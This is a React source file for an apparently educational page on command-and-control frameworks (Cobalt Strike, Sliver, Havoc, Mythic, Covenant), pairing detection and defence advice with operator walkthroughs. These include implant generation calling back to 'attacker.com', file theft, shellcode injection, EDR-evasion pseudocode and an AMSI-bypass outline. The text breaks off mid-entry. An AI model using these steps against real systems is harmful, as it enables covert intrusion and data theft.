import {
  Box,
  Button,
  Typography,
  Container,
  Paper,
  alpha,
  useTheme,
  Chip,
  Grid,
  Card,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Divider,
  Alert,
  AlertTitle,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Stepper,
  Step,
  StepLabel,
  StepContent,
  Drawer,
  Fab,
  IconButton,
  LinearProgress,
  useMediaQuery,
} from "@mui/material";
import { useState, useEffect } from "react";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import { useNavigate, Link } from "react-router-dom";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import SettingsRemoteIcon from "@mui/icons-material/SettingsRemote";
import CloudIcon from "@mui/icons-material/Cloud";
import SecurityIcon from "@mui/icons-material/Security";
import TerminalIcon from "@mui/icons-material/Terminal";
import BuildIcon from "@mui/icons-material/Build";
import VisibilityOffIcon from "@mui/icons-material/VisibilityOff";
import NetworkCheckIcon from "@mui/icons-material/NetworkCheck";
import SchoolIcon from "@mui/icons-material/School";
import WarningAmberIcon from "@mui/icons-material/WarningAmber";
import WarningIcon from "@mui/icons-material/Warning";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import HttpIcon from "@mui/icons-material/Http";
import DnsIcon from "@mui/icons-material/Dns";
import VpnKeyIcon from "@mui/icons-material/VpnKey";
import ComputerIcon from "@mui/icons-material/Computer";
import StorageIcon from "@mui/icons-material/Storage";
import CodeIcon from "@mui/icons-material/Code";
import SpeedIcon from "@mui/icons-material/Speed";
import ShieldIcon from "@mui/icons-material/Shield";
import BugReportIcon from "@mui/icons-material/BugReport";
import AccountTreeIcon from "@mui/icons-material/AccountTree";
import HistoryIcon from "@mui/icons-material/History";
import GroupsIcon from "@mui/icons-material/Groups";
import PublicIcon from "@mui/icons-material/Public";
import LightbulbIcon from "@mui/icons-material/Lightbulb";
import TimelineIcon from "@mui/icons-material/Timeline";
import PsychologyIcon from "@mui/icons-material/Psychology";
import TrendingUpIcon from "@mui/icons-material/TrendingUp";
import LockIcon from "@mui/icons-material/Lock";
import RouterIcon from "@mui/icons-material/Router";
import LanguageIcon from "@mui/icons-material/Language";
import SyncAltIcon from "@mui/icons-material/SyncAlt";
import MemoryIcon from "@mui/icons-material/Memory";
import FingerprintIcon from "@mui/icons-material/Fingerprint";
import GavelIcon from "@mui/icons-material/Gavel";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";
import QuizIcon from "@mui/icons-material/Quiz";
import ListAltIcon from "@mui/icons-material/ListAlt";
import CloseIcon from "@mui/icons-material/Close";
import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";

// C2 Framework data with expanded details
const c2Frameworks = [
  {
    name: "Cobalt Strike",
    type: "Commercial",
    language: "Java",
    description: "Industry-standard adversary simulation platform with Beacon payload",
    longDescription: "Cobalt Strike is the de facto standard for commercial red team operations. Originally created by Raphael Mudge, it provides a mature, battle-tested platform for adversary simulation. The Beacon payload is highly customizable through Malleable C2 profiles, allowing operators to mimic specific threat actors or blend with legitimate traffic. Its team server model enables collaborative operations with multiple operators working simultaneously.",
    deepDiveContent: `
## History & Background

Cobalt Strike was created by **Raphael Mudge** in 2012 as an extension to the Armitage GUI for Metasploit. It evolved into a standalone commercial product and has become the gold standard for professional red team operations. In 2020, HelpSystems (now Fortra) acquired Cobalt Strike, and it continues active development today.

The tool gained notoriety not just for legitimate red team use, but unfortunately also for being weaponized by real threat actors after cracked versions leaked online. This dual-use nature means defenders must understand Cobalt Strike intimately.

## Architecture Deep Dive

### Team Server
The team server is the central command hub that runs on your attack infrastructure:
- **Multi-operator support**: Multiple red teamers can connect simultaneously
- **Data management**: All session data, credentials, and screenshots stored centrally  
- **Event log**: Comprehensive audit trail of all operator actions
- **Shared sessions**: Operators can collaborate on the same beacon sessions

### Beacon Payload
Beacon is Cobalt Strike's signature implant:
- **Asynchronous communication**: Beacons "check in" periodically rather than maintaining persistent connections
- **Sleep/Jitter**: Configurable callback intervals (sleep) with randomization (jitter) to evade detection
- **Malleable C2**: Traffic profiles completely customize network indicators
- **In-memory execution**: Beacon operates entirely in memory, minimizing disk artifacts

### Malleable C2 Profiles
These configuration files define every aspect of Beacon's network traffic:
\`\`\`
# Example: Mimicking Amazon CDN traffic
http-get {
    set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
    client {
        header "Accept" "*/*";
        header "Host" "www.amazon.com";
        metadata {
            base64url;
            prepend "session-token=";
            header "Cookie";
        }
    }
}
\`\`\`

## Key Capabilities

### Beacon Object Files (BOFs)
BOFs revolutionized Cobalt Strike by enabling:
- Small position-independent code that runs inside Beacon
- No new process creation required
- Extends functionality without touching disk
- Massive community ecosystem of BOFs for everything from AD enumeration to EDR evasion

### Post-Exploitation Features
- **Mimikatz integration**: Built-in credential harvesting
- **Kerberoasting/AS-REP roasting**: Active Directory attacks
- **DCSync**: Domain Controller replication attacks
- **Golden/Silver tickets**: Kerberos ticket forging
- **Pass-the-hash/Pass-the-ticket**: Credential reuse
- **Port forwarding/SOCKS proxy**: Network pivoting

### Aggressor Scripts
Cobalt Strike's scripting language allows:
- Automated workflows
- Custom menus and commands
- Integration with external tools
- Event-driven automation

## Detection Indicators

### Network Signatures
| Indicator | Default Value | Notes |
|-----------|--------------|-------|
| JA3 Fingerprint | 72a589da586844d7f0818ce684948eea | Default Java TLS fingerprint |
| Default URIs | /submit.php, /pixel.gif, /___updatecheck | Easily customized via malleable profiles |
| Beaconing | Regular intervals with consistent packet sizes | Statistical analysis detects patterns |
| Certificate | Default self-signed or Let's Encrypt | Analyze cert metadata |

### Host Indicators  
- Named pipes: \\\\.\\pipe\\msagent_*, \\\\.\\pipe\\MSSE-*
- Default service name patterns
- Process injection into rundll32.exe, dllhost.exe
- Specific memory patterns (YARA rules exist)

### Defensive Recommendations
1. **JA3 blocking**: Block or alert on known Cobalt Strike JA3 hashes
2. **Beaconing detection**: Use tools like RITA to identify periodic callbacks
3. **Memory scanning**: Deploy YARA rules for Beacon patterns
4. **Named pipe monitoring**: Alert on anomalous named pipe creation
5. **Certificate analysis**: Flag suspicious certificate patterns

## Learning Resources

- **Official Training**: Cobalt Strike's 4-day Red Team Operations course
- **Red Team Field Manual**: Covers CS workflows
- **Raphael Mudge's Blog**: https://blog.cobaltstrike.com
- **CS Community Kit**: https://cobalt-strike.github.io/community_kit/
- **Malleable-C2-Profiles**: GitHub repository with community profiles
    `,
    features: ["Malleable C2 profiles", "Beacon payload", "Team server", "Aggressor scripting", "OPSEC features", "BOF (Beacon Object Files)", "Process injection", "Kerberos attacks", "Lateral movement"],
    protocols: ["HTTP/HTTPS", "DNS", "SMB", "TCP"],
    difficulty: "Advanced",
    cost: "Commercial ($5,900/user/year)",
    url: "https://www.cobaltstrike.com",
    useCases: ["Enterprise red team engagements", "APT simulation", "Purple team exercises", "Adversary emulation"],
    limitations: ["Expensive licensing", "Heavily signatured by defenders", "Cracked versions used by real attackers"],
    versionHistory: [
      { version: "4.9", date: "2023", highlights: "Sleep mask improvements, BOF enhancements" },
      { version: "4.8", date: "2023", highlights: "Post-ex BOFs, arsenal kit updates" },
      { version: "4.7", date: "2022", highlights: "User-defined reflective loader" },
      { version: "4.5", date: "2021", highlights: "Process injection improvements" },
    ],
    communityResources: [
      "r/cobaltstrikedev subreddit",
      "Cobalt Strike Discord (official)",
      "CS Community Kit GitHub",
      "ired.team notes",
    ],
  },
  {
    name: "Sliver",
    type: "Open Source",
    language: "Go",
    description: "Modern, cross-platform C2 framework with multiplayer support",
    longDescription: "Developed by BishopFox, Sliver is a modern open-source alternative to commercial C2 frameworks. Written in Go, it produces cross-platform implants for Windows, macOS, and Linux. Sliver's multiplayer mode allows multiple operators to collaborate in real-time, similar to Cobalt Strike's team server. The Armory extension system enables community-contributed tools and capabilities.",
    deepDiveContent: `
## History & Background

Sliver was developed by **BishopFox**, a leading offensive security firm, and released as open source in 2019. It was designed to be a modern, freely available alternative to commercial tools like Cobalt Strike. The project has seen rapid adoption in the security community due to its feature-rich design and active development.

Written entirely in **Go**, Sliver benefits from:
- Cross-compilation to Windows, Linux, and macOS from any platform
- Statically compiled binaries with no external dependencies
- Strong cryptographic primitives built into the language
- Excellent concurrency for handling many simultaneous connections

## Architecture Deep Dive

### Server Architecture
The Sliver server handles all implant communications and operator interactions:
\`\`\`
┌─────────────────────────────────────────────────┐
│                  Sliver Server                   │
├──────────────┬──────────────┬──────────────────┤
│  Listeners   │   Sessions   │    Database      │
│  (HTTP/DNS/  │  Management  │   (SQLite/       │
│   mTLS/WG)   │              │    PostgreSQL)   │
└──────┬───────┴──────┬───────┴────────┬─────────┘
       │              │                │
   Implants      Operators         Armory
\`\`\`

### Implant Types

**Sessions (Interactive)**
- Persistent connections maintained with the server
- Lower latency command execution
- Higher network visibility

**Beacons (Asynchronous)**  
- Periodic check-ins like Cobalt Strike
- Better for long-term operations
- Configurable sleep intervals with jitter

### Communication Protocols

| Protocol | Use Case | Notes |
|----------|----------|-------|
| mTLS | Primary secure channel | Mutual TLS with certificate pinning |
| WireGuard | Encrypted tunnel | Modern VPN protocol, very fast |
| HTTP(S) | Firewall traversal | Blends with web traffic |
| DNS | Covert channel | Tunnels data through DNS queries |

### Procedural C2
Sliver can generate unique C2 profiles per implant using procedural generation:
- Random URI paths
- Varied HTTP headers
- Unique encoding schemes
- Makes pattern-based detection much harder

## Key Capabilities

### Armory Extension System
The Armory is Sliver's package manager for extensions:
\`\`\`bash
# List available packages
sliver> armory

# Install Rubeus for Kerberos attacks
sliver> armory install rubeus

# Install SharpHound for AD enumeration
sliver> armory install sharphound
\`\`\`

Popular Armory packages:
- **Rubeus**: Kerberos abuse toolkit
- **SharpHound**: BloodHound data collector
- **Seatbelt**: Security posture assessment
- **Certify**: AD Certificate Services attacks

### Pivoting Capabilities
\`\`\`bash
# SOCKS5 proxy through implant
sliver> socks5 start

# Port forwarding
sliver> portfwd add -l 8080 -r 10.0.0.1:80

# WireGuard tunnel for full network access
sliver> wg-portfwd add --bind 0.0.0.0:51820 --remote 10.0.0.0/24
\`\`\`

### Multiplayer Mode
Multiple operators can connect simultaneously:
\`\`\`bash
# Generate operator config
./sliver-server operator --name alice --lhost team.example.com

# Operators connect with their configs
./sliver-client import alice.cfg
\`\`\`

## Detection Indicators

### Network Signatures
| Indicator | Details |
|-----------|---------|
| Default mTLS port | 8888 |
| Go TLS fingerprint | Various, depends on Go version |
| DNS patterns | High-entropy subdomains |
| HTTP patterns | Binary data in response bodies |

### Host Indicators
- Process genealogy anomalies
- Memory patterns for implant detection
- Unusual outbound connections from non-browser processes

### Defensive Recommendations
1. Monitor for mTLS connections on non-standard ports
2. Analyze DNS query patterns for tunneling indicators
3. Profile Go binary execution on endpoints
4. Implement network segmentation to limit lateral movement

## Getting Started Tutorial

\`\`\`bash
# 1. Download latest release
curl -sL https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux -o sliver-server
chmod +x sliver-server

# 2. Start the server (generates certs on first run)
./sliver-server

# 3. Create a listener
sliver> mtls --lhost 0.0.0.0 --lport 8888

# 4. Generate an implant
sliver> generate --mtls attacker.com:8888 --os windows --arch amd64 --save implant.exe

# 5. When implant executes, interact with session
sliver> sessions
sliver> use <session-id>

# 6. Run commands
sliver (IMPLANT)> whoami
sliver (IMPLANT)> ps
sliver (IMPLANT)> download C:\\\\Users\\\\admin\\\\Desktop\\\\secrets.txt
\`\`\`

## Learning Resources

- **Official Documentation**: https://sliver.sh/docs
- **BishopFox Blog**: Attack techniques and Sliver tutorials
- **GitHub Discussions**: Community Q&A
- **YouTube**: Multiple walkthrough videos available
- **Sliver Armory**: https://github.com/sliverarmory
    `,
    features: ["Implant generation", "Multiplayer mode", "Armory extensions", "Staging support", "mTLS security", "WireGuard tunnels", "DNS canaries", "Procedural C2", "HTTPS certificate pinning"],
    protocols: ["HTTP/HTTPS", "DNS", "mTLS", "WireGuard"],
    difficulty: "Intermediate",
    cost: "Free (BSD-3)",
    url: "https://github.com/BishopFox/sliver",
    useCases: ["Budget-conscious red teams", "Cross-platform operations", "Learning C2 concepts", "Open-source alternative to CS"],
    limitations: ["Less mature than Cobalt Strike", "Smaller community", "Fewer ready-made integrations"],
    versionHistory: [
      { version: "1.5.x", date: "2023-2024", highlights: "Improved evasion, new extensions" },
      { version: "1.4.x", date: "2022", highlights: "Beacon mode, traffic shaping" },
      { version: "1.3.x", date: "2021", highlights: "Armory system introduced" },
    ],
    communityResources: [
      "GitHub Discussions",
      "BishopFox Discord",
      "Sliver Armory GitHub",
      "#sliver on various security Discords",
    ],
  },
  {
    name: "Havoc",
    type: "Open Source",
    language: "C/C++/Go",
    description: "Modern C2 framework with advanced evasion and a clean UI",
    longDescription: "Havoc is a relatively new open-source C2 framework that focuses heavily on EDR evasion. The Demon agent uses advanced techniques like indirect syscalls, sleep obfuscation, and memory encryption to evade modern endpoint detection. Its clean Qt-based GUI provides an intuitive interface for operators, and the modular architecture allows for easy extension.",
    deepDiveContent: `
## History & Background

Havoc was created by **C5pทder** (Paul Ungur) and released in 2022 as a modern, open-source C2 framework specifically designed to evade modern EDR solutions. Unlike older frameworks that were retrofitted with evasion capabilities, Havoc was built from the ground up with EDR bypass as a core design principle.

The framework gained rapid adoption in the red team community due to:
- Native EDR evasion techniques
- Clean, modern GUI built with Qt
- Active development and community engagement
- Open-source availability

## Architecture Deep Dive

### Component Overview
\`\`\`
┌────────────────────────────────────────────────────┐
│                  Havoc Teamserver                   │
│                    (Go/C++)                         │
├────────────────┬──────────────┬───────────────────┤
│   Listeners    │   Database   │   Operator API    │
│  (HTTP/SMB)    │   (SQLite)   │   (WebSocket)     │
└───────┬────────┴──────────────┴─────────┬─────────┘
        │                                  │
    Demon                           Havoc Client
    Agents                          (Qt GUI)
\`\`\`

### The Demon Agent

The **Demon** is Havoc's implant, written primarily in C with assembly components for low-level operations:

**Memory Architecture:**
- Operates entirely in memory
- Heap/stack encryption during sleep
- Position-independent code design
- No static strings - all APIs resolved at runtime

**Execution Flow:**
\`\`\`
1. Initial execution
2. Resolve ntdll.dll base address
3. Resolve required syscalls via SSN extraction
4. Unmap/remap ntdll if needed (unhooking)
5. Establish C2 connection
6. Enter check-in loop with sleep obfuscation
\`\`\`

## Evasion Techniques Deep Dive

### Indirect Syscalls
Instead of calling syscall stubs in ntdll.dll (where EDR hooks reside), Havoc:
1. Reads the System Service Number (SSN) from ntdll
2. Constructs the syscall instruction manually
3. Executes from its own code, bypassing hooks

\`\`\`c
// Pseudocode for indirect syscall
NTSTATUS IndirectSyscall(DWORD ssn, ...) {
    // SSN extracted from ntdll, syscall executed from Demon memory
    asm volatile(
        "mov r10, rcx\\n"
        "mov eax, %[ssn]\\n"
        "syscall\\n"
        : : [ssn] "r" (ssn)
    );
}
\`\`\`

### Sleep Obfuscation
During sleep periods, the Demon:
1. **Encrypts** its heap and stack segments
2. **Spoofs** the return address stack
3. **Changes** memory permissions to non-executable
4. **Queues** an APC to wake and decrypt

This prevents memory scanners from finding implant signatures while sleeping.

### Return Address Spoofing
When calling Windows APIs:
- Real return address is hidden
- Spoofed address points to legitimate code (e.g., kernel32.dll)
- Defeats call stack analysis by EDRs

### Stack Duplication
Some EDRs scan the current thread's stack:
- Havoc copies the stack to a new location
- Encrypts the original
- Decrypts and restores after operation

## Key Capabilities

### BOF Support
Havoc supports Cobalt Strike-compatible BOFs:
\`\`\`
demon> inline-execute /path/to/bof.o arg1 arg2
demon> bof-load dir_list
\`\`\`

### Module System
Extend functionality without modifying core:
- Custom modules loaded at runtime
- PowerShell execution
- .NET assembly loading
- Shellcode injection

### Process Manipulation
\`\`\`
demon> proc list                    # List processes
demon> proc kill 1234               # Kill process
demon> shellcode inject x64 1234 /path/shellcode.bin
demon> proc ppidspoof               # Parent PID spoofing
\`\`\`

## Detection Considerations

### What Havoc Beats
- ✓ Userland API hooking
- ✓ Call stack analysis (basic)
- ✓ Memory pattern scanning (during sleep)
- ✓ ETW tracing (with patches)

### What Can Still Detect
- Kernel-level visibility (ETW-Ti)
- Hardware breakpoints
- Hypervisor-based monitoring
- Network traffic analysis
- Behavioral analysis over time

### Detection Strategies
1. **Kernel callbacks**: Monitor from kernel mode
2. **Hardware telemetry**: CPU event monitoring
3. **Network analysis**: HTTP patterns, beaconing
4. **Anomaly detection**: Unusual process behaviors

## Getting Started Tutorial

\`\`\`bash
# Clone the repository
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

# Build teamserver
cd teamserver
go build
./teamserver server --profile ./profiles/havoc.yaotl

# Build client (needs Qt5)
cd ../client
mkdir build && cd build
cmake ..
make
./Havoc

# In the GUI:
# 1. Add new listener (HTTP)
# 2. Create Demon payload
# 3. Deploy and interact
\`\`\`

## Learning Resources

- **GitHub Wiki**: https://github.com/HavocFramework/Havoc/wiki
- **C5pทder's Blog**: Technical deep-dives
- **YouTube**: Multiple tutorial videos
- **Discord**: Active community support
- **Source code**: Learn evasion techniques by reading implementation
    `,
    features: ["Demon agent", "Sleep obfuscation", "Indirect syscalls", "BOF support", "Module system", "Custom shellcode", "Return address spoofing", "Stack duplication", "Heap encryption"],
    protocols: ["HTTP/HTTPS", "SMB"],
    difficulty: "Intermediate",
    cost: "Free",
    url: "https://github.com/HavocFramework/Havoc",
    useCases: ["EDR evasion testing", "Modern Windows environments", "Advanced red team operations"],
    limitations: ["Windows-focused", "Less mature", "Smaller community", "Documentation gaps"],
    versionHistory: [
      { version: "0.6", date: "2023", highlights: "Module system, improved stability" },
      { version: "0.5", date: "2022", highlights: "Initial public release" },
    ],
    communityResources: [
      "Havoc Discord Server",
      "GitHub Issues/Discussions",
      "Twitter/X #havocframework",
    ],
  },
  {
    name: "Mythic",
    type: "Open Source",
    language: "Go/Python",
    description: "Collaborative, multi-platform red team framework with web UI",
    longDescription: "Mythic takes a unique approach by being agent-agnostic - it provides the C2 infrastructure while allowing operators to use different agent implementations (called 'Payload Types'). Built on Docker, it's easy to deploy and manage. The web-based UI provides real-time updates, task tracking, and comprehensive reporting capabilities.",
    deepDiveContent: `
## History & Background

Mythic was created by **Cody Thomas** (@its_a_feature_) and has evolved through several major versions. Originally known as "Apfell" (focused on macOS), it was redesigned as Mythic to support any operating system through its modular agent architecture.

The key innovation of Mythic is its **agent-agnostic design**:
- The Mythic server provides the infrastructure
- Agents (Payload Types) are separate projects
- New agents can be developed without modifying the core
- Community contributes diverse agent implementations

## Architecture Deep Dive

### Docker-Based Architecture
\`\`\`
┌────────────────── Docker Compose Stack ──────────────────┐
│                                                           │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────┐  │
│  │   Mythic    │  │   Mythic    │  │    Mythic       │  │
│  │   Server    │  │   React     │  │    Postgres     │  │
│  │   (Go)      │  │   (Web UI)  │  │    (Database)   │  │
│  └──────┬──────┘  └─────────────┘  └─────────────────┘  │
│         │                                                 │
│  ┌──────┴──────────────────────────────────────────────┐ │
│  │              RabbitMQ Message Bus                    │ │
│  └──────────────────────────────────────────────────────┘ │
│         │                 │                    │          │
│  ┌──────┴───┐     ┌──────┴───┐        ┌──────┴───┐      │
│  │  Apollo  │     │ Poseidon │        │  Medusa  │      │
│  │  Agent   │     │  Agent   │        │  Agent   │      │
│  └──────────┘     └──────────┘        └──────────┘      │
└───────────────────────────────────────────────────────────┘
\`\`\`

### Payload Types (Agents)

Each agent is a separate Docker container that communicates via RabbitMQ:

| Agent | Language | Platforms | Specialty |
|-------|----------|-----------|-----------|
| Apollo | C# | Windows | Full-featured, AD attacks |
| Poseidon | Go | Linux/macOS/Windows | Cross-platform |
| Medusa | Python | Linux/macOS/Windows | Cross-platform, extensible |
| Athena | C# | Linux/macOS/Windows | .NET cross-platform |
| Merlin | Go | Linux/macOS/Windows | HTTP/2, QUIC support |
| Hannibal | C | Windows | EDR evasion focus |

### C2 Profiles
C2 Profiles define how agents communicate:
- **HTTP**: Standard web traffic
- **SMB**: Named pipe communication
- **TCP**: Direct TCP connections  
- **WebSocket**: Real-time bidirectional
- **Custom**: Build your own!

## Key Capabilities

### Real-Time Web Interface
The React-based UI provides:
- **Live callbacks**: Instant notification of new agents
- **Task tracking**: Visual status of all commands
- **File browser**: Navigate target file systems
- **Process browser**: Interactive process management
- **Credential manager**: Centralized credential storage
- **Graph views**: Visualize agent relationships

### Task Management
\`\`\`
Every task has:
├── Status (submitted → processing → processed)
├── Operator who submitted
├── Timestamp
├── Full output and errors
├── Artifacts generated
└── MITRE ATT&CK mapping
\`\`\`

### Scripting & Automation
Mythic provides a full REST API and Python scripting:
\`\`\`python
from mythic import mythic_rest

# Connect to Mythic
mythic = mythic_rest.Mythic(
    username="mythic_admin",
    password="password",
    server_ip="localhost",
    server_port=7443
)

# Get all callbacks
async def list_callbacks():
    callbacks = await mythic.get_all_callbacks()
    for cb in callbacks:
        print(f"{cb.id} - {cb.host} - {cb.user}")
\`\`\`

### Reporting
Built-in reporting includes:
- Timeline of all operations
- MITRE ATT&CK mapping
- Artifact tracking
- Credential summary
- Exportable formats

## Agent Development

Mythic makes custom agent development straightforward:

### Agent Structure
\`\`\`
my_agent/
├── Dockerfile
├── rabbitmq_config.json
├── agent_functions/
│   ├── builder.py          # Payload generation
│   ├── shell.py            # shell command
│   ├── upload.py           # file upload
│   └── ...
├── payload/
│   └── agent_code/         # Actual agent source
└── mythic/
    └── agent_config.json   # Agent metadata
\`\`\`

### Adding a Command
\`\`\`python
# agent_functions/whoami.py
from mythic_container.MythicCommandBase import *

class WhoamiArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)

class WhoamiCommand(CommandBase):
    cmd = "whoami"
    description = "Get current user context"
    
    async def create_go_tasking(self, taskData):
        return BrowserScriptResponse(task=taskData.Task)
\`\`\`

## Detection Considerations

### Network Indicators
- Default ports: 7443 (UI), customizable for C2
- HTTP patterns depend on C2 profile
- Potential for HTTP/2 and QUIC (Merlin agent)

### Host Indicators
- Agent-specific (varies by payload type)
- Apollo: .NET assembly indicators
- Poseidon: Go binary characteristics  
- Container-based infrastructure is distinctive

### Defensive Recommendations
1. Monitor for Docker deployment patterns
2. Profile specific agent behaviors
3. Network traffic analysis for C2 patterns
4. Correlation of callbacks with other activity

## Getting Started Tutorial

\`\`\`bash
# 1. Clone Mythic
git clone https://github.com/its-a-feature/Mythic
cd Mythic

# 2. Run installer
./install_docker_ubuntu.sh  # For Ubuntu
# or
./install_docker_macos.sh   # For macOS

# 3. Start Mythic
./mythic-cli start

# 4. Install an agent (e.g., Apollo)
./mythic-cli install github https://github.com/MythicAgents/Apollo

# 5. Install a C2 profile
./mythic-cli install github https://github.com/MythicC2Profiles/http

# 6. Access web UI
# URL: https://localhost:7443
# Credentials in .env file (or ./mythic-cli config)

# 7. In the UI:
# - Create a new payload with Apollo + HTTP
# - Download and deploy
# - Interact via the callbacks tab
\`\`\`

## Learning Resources

- **Official Docs**: https://docs.mythic-c2.net/
- **GitHub**: https://github.com/its-a-feature/Mythic
- **Agent Repos**: https://github.com/MythicAgents
- **C2 Profiles**: https://github.com/MythicC2Profiles
- **YouTube**: Mythic walkthrough videos
- **Cody Thomas's Blog**: Technical articles
    `,
    features: ["Agent agnostic", "Docker-based", "Real-time updates", "Task tracking", "Reporting", "Multiple payload types", "SOCKS proxying", "File browser", "Process browser", "Credential management"],
    protocols: ["HTTP/HTTPS", "TCP", "SMB", "WebSocket"],
    difficulty: "Intermediate",
    cost: "Free",
    url: "https://github.com/its-a-feature/Mythic",
    useCases: ["Custom agent development", "Multi-platform operations", "Team collaboration", "Educational purposes"],
    limitations: ["Resource intensive", "Learning curve for custom agents", "Docker dependency"],
    versionHistory: [
      { version: "3.x", date: "2023-2024", highlights: "React UI, improved performance" },
      { version: "2.x", date: "2021-2022", highlights: "Major rewrite, new agent system" },
      { version: "1.x", date: "2019-2020", highlights: "Original Apfell design" },
    ],
    communityResources: [
      "Mythic Documentation",
      "GitHub Discussions",
      "BloodHound Slack - #mythic channel",
      "Twitter @its_a_feature_",
    ],
  },
  {
    name: "Covenant",
    type: "Open Source",
    language: "C#/.NET",
    description: ".NET-based C2 framework with collaborative features",
    longDescription: "Covenant is a .NET-based C2 framework designed for collaborative red team operations. It uses 'Grunt' implants that leverage the .NET runtime for execution, making it particularly effective in Windows enterprise environments. The web interface provides task management, listener configuration, and real-time collaboration features.",
    deepDiveContent: `
## History & Background

Covenant was created by **Ryan Cobb** (@coaborr) and released in 2019. It was designed as a .NET-focused alternative to PowerShell-based frameworks at a time when PowerShell was becoming heavily monitored.

Key motivations:
- PowerShell script block logging made PS attacks visible
- AMSI was blocking obfuscated PowerShell
- Organizations weren't monitoring .NET as closely
- Need for collaborative red team tooling

**Note**: Development has slowed significantly since 2021. The project is still functional but may lack recent evasion updates.

## Architecture Deep Dive

### Component Overview
\`\`\`
┌─────────────────── Covenant Architecture ───────────────────┐
│                                                              │
│  ┌──────────────────────────────────────────────────────┐   │
│  │            Covenant Server (ASP.NET Core)             │   │
│  ├────────────────┬──────────────┬─────────────────────┤   │
│  │   Listeners    │   Database   │    Web Interface    │   │
│  │   (HTTP/SMB)   │   (SQLite)   │    (Blazor)         │   │
│  └───────┬────────┴──────────────┴─────────────────────┘   │
│          │                                                   │
│   ┌──────┴──────┐                                           │
│   │    Grunt    │  ← .NET assembly executed on targets      │
│   │   Implants  │                                           │
│   └─────────────┘                                           │
└──────────────────────────────────────────────────────────────┘
\`\`\`

### Grunt Implants
Grunts are .NET assemblies that execute in target environments:
- Written in C#
- Can be compiled to various formats (EXE, DLL, PS1)
- Support for .NET Framework and .NET Core
- Customizable templates

### Listeners
| Type | Description |
|------|-------------|
| HTTP | Standard HTTP/HTTPS communication |
| Bridge | Link listeners across network segments |
| SMB | Named pipe for internal pivoting |

## Key Capabilities

### Task-Based Model
\`\`\`csharp
// Grunt task execution flow
1. Operator submits task in web UI
2. Task queued in database
3. Grunt checks in and receives task
4. Grunt executes and returns results
5. Results displayed in UI
\`\`\`

### GruntTask Library
Pre-built tasks include:
- **Assembly**: Load and execute .NET assemblies
- **Shell/ShellCmd**: Command execution
- **PowerShell**: PS execution via runspace
- **Upload/Download**: File transfers
- **Token manipulation**: Impersonation attacks
- **Credential access**: Mimikatz-style attacks

### Graph Visualization
UI shows relationships between:
- Listeners and Grunts
- Pivoting paths
- Operator activities

### Templates
Covenant's template system allows:
- Custom implant code
- Modified evasion techniques
- Build-time obfuscation

## .NET Tradecraft

### Why .NET for Red Teams?
- Enterprise environments run .NET
- Less monitored than PowerShell historically
- In-memory execution via Assembly.Load()
- Access to Windows APIs via P/Invoke

### Execution Flow
\`\`\`
1. Stage delivery (various methods)
2. .NET runtime loads Grunt assembly
3. Grunt establishes C2 communication
4. Tasks execute via reflection
5. Results serialized and returned
\`\`\`

### AMSI Bypass
Covenant tasks can include AMSI patches:
\`\`\`csharp
// Example AMSI bypass pattern
var amsi = LoadLibrary("amsi.dll");
var amsiScan = GetProcAddress(amsi, "AmsiScanBuffer");
// Patch to return clean result
\`\`\`

## Detection Considerations

### Network Indicators
- HTTP callback patterns
- .NET assembly transfer sizes
- Base64 in headers (default)
- Predictable URI paths (customizable)

### Host Indicators
- .NET assembly loading events (ETW)
- CLR profiler events
- Unusual processes loading CLR
- Memory patterns of Grunt

### Defensive Recommendations
1. Enable .NET ETW providers
2. Monitor for Assembly.Load() patterns
3. Flag unusual .NET assembly execution
4. Network traffic analysis for beaconing

## Getting Started

\`\`\`bash
# Clone repository
git clone https://github.com/cobbr/Covenant
cd Covenant/Covenant

# Build and run (requires .NET Core SDK)
dotnet build
dotnet run

# Access web interface
# https://localhost:7443
# Create admin account on first run

# In the UI:
# 1. Create HTTP Listener
# 2. Create Launcher (PowerShell, Binary, etc.)
# 3. Execute launcher on target
# 4. Interact with Grunt in Grunt tab
\`\`\`

## Learning Resources

- **GitHub**: https://github.com/cobbr/Covenant
- **Ryan Cobb's Blog**: Technical articles
- **Wiki**: https://github.com/cobbr/Covenant/wiki
- **YouTube**: Setup and operation tutorials
    `,
    features: ["Grunt implants", "Web interface", "Task management", ".NET execution", "Listener management", "Graph visualization", "Template customization", "API access", "Multi-user support"],
    protocols: ["HTTP/HTTPS", "SMB"],
    difficulty: "Intermediate",
    cost: "Free",
    url: "https://github.com/cobbr/Covenant",
    useCases: [".NET environments", "Windows-focused operations", "Learning C2 development"],
    limitations: ["Development appears stalled", ".NET dependency on targets", "Windows-centric"],
    versionHistory: [
      { version: "0.6", date: "2021", highlights: "Last significant update" },
      { version: "0.5", date: "2020", highlights: ".NET Core support" },
    ],
    communityResources: [
      "GitHub Wiki",
      "Archived discussions",
      "Community forks",
    ],
  },
  {
    name: "Brute Ratel C4",
    type: "Commercial",
    language: "C/C++",
    description: "Red team & adversary simulation framework focused on EDR evasion",
    longDescription: "Brute Ratel C4 (BRc4) was developed by Chetan Nayak (Paranoid Ninja) with a specific focus on evading modern EDR solutions. The 'Badger' agent uses direct syscalls, sleep masking, memory encryption, and other advanced techniques to remain undetected. It's become popular for operations against well-defended enterprise environments.",
    deepDiveContent: `
## History & Background

Brute Ratel C4 was created by **Chetan Nayak** (known as Paranoid Ninja), a former CrowdStrike red teamer who understood EDR internals deeply. The framework was released commercially in late 2020 as a purpose-built EDR evasion platform.

### Controversy
In September 2022, cracked versions of BRc4 appeared on criminal forums, leading to:
- Nation-state actors using the tool
- Ransomware groups deploying Badgers
- Increased defensive scrutiny
- License verification improvements

This highlights the dual-use challenge of offensive security tools.

## Architecture Deep Dive

### Core Philosophy
BRc4 was designed with one primary goal: **evade EDR at all costs**. Every design decision prioritizes stealth over convenience.

### Badger Agent
